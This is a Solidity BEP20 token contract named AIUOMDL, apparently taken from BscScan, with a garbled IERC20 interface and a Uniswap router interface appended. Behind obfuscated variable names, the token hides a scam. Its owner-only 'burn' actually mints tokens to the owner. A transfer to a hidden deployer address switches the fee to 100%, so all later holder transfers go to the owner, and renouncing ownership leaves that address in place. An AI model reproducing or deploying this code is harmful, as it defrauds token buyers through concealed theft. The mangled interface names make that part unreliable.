/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.5.14;
contract AIUOMDL {
uint256 public  WJMiAW = 100000000000000000000;
address public  vddTzM = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  GzWRfe = address(0);
string public  name = "AIUOMDL";
uint8 public constant decimals = 18;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  DWElen = 1000000000000000000;
address public  HIEDAm = address(0);
uint256 public  gHOgBR = 100000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant fPlzqG = 9+1;
uint256 public  Mwinrs = 10000000000000000;
address public  newuHt = address(0);
mapping (address => uint256) public balanceOf;
address public owner;
string public  symbol = "AIUOMDL";
address public  tusCaC = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public  hwPLSH = address(0);
address public  ZCAMil = address(0);
uint256 private  fGSKZg = 10000000000000;
uint256 public  kApAJB = 100000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  htCeWU = 10000000000000000000;
uint256 public  eZETmZ = 100000000000000000000000;
uint256 public  vMWXFs = 10000000000000000000000000000;
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
constructor () public {
GzWRfe = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "CElWIH");
require(to != address(0), "CElWIH");
require(amount <= balanceOf[from], "CElWIH");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* fPlzqG/fGSKZg ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==GzWRfe){
fGSKZg = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}

}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balancgfgeOf(address account) external view returns (uint256);
    event Approoioval(address indexed owner, address indexed spender, uint256 value);
    function transewqefer(address recipient, uint256 amount) external returns (bool);
    function allowadsdance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFjhkrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transretfer(address indexed from, address indexed to, uint256 value);
    
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut1(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn2(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut3(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn4(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}